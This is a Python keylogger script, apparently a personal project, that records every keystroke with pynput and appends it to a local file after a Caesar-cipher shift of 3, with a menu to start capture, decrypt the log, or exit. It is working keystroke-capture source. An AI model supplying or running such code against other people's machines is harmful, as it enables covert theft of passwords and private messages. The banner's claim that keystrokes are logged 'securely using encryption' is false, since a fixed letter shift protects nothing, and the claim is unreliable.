import pynput
from pynput.keyboard import Key, Listener

def Encryption(plaintext, key_val):
    ciphertext = ''
    for special in plaintext:
        if special.isalpha():
            offset = 65 if special.isupper() else 97
            ciphertext += chr((ord(special) + key_val - offset) % 26 + offset)
        else:
            ciphertext += special  
    return ciphertext

def Decryption(ciphertext, key_val):
    plaintext = ''
    for special in ciphertext:
        if special.isalpha():
            offset = 65 if special.isupper() else 97
            plaintext += chr((ord(special) - key_val - offset) % 26 + offset)
        else:
            plaintext += special  
    return plaintext

def on_press(key):
    try:
        encrypted_key = Encryption(key.char, 3)  
        with open("encrypted_log.txt", "a") as log_file:
            log_file.write(f'{encrypted_key}')
    except AttributeError:
        with open("encrypted_log.txt", "a") as log_file:
            log_file.write(f' [{key}] ')

def on_release(key):
    if key == Key.esc:
        return False


print("Welcome to Sarthak's Keylogger!")
print("This program captures and logs your keystrokes securely using encryption.")
print("Please use this tool responsibly and with proper consent.")


while True:
    print("\n[*] Press 1 to start capturing and logging encrypted keystrokes.")
    print("[*] Press 2 to decrypt and view logged keystrokes.")
    print("[*] Press 3 to exit.")
    
    choice = input("Insert Here: ")
    
    if choice.isdigit():
        if choice == '1':
            print("Starting keylogger... (Press ESC to stop)")
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        elif choice == '2':
            encrypted_file = input("Insert the name of the encrypted log file (e.g., 'encrypted_log.txt'): ")
            key = int(input("Insert the shift value used for encryption: "))
            try:
                with open(encrypted_file, "r") as log_file:
                    encrypted_content = log_file.read()
                    decrypted_content = Decryption(encrypted_content, key)
                    print(f'\nDecrypted content:\n{decrypted_content}')
            except FileNotFoundError:
                print("Error: File not found. Please check the file name and try again.")
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")
    else:
        print("Invalid input. Please enter a numeric value.")

print("Thank you for using Sarthak's  Keylogger!")
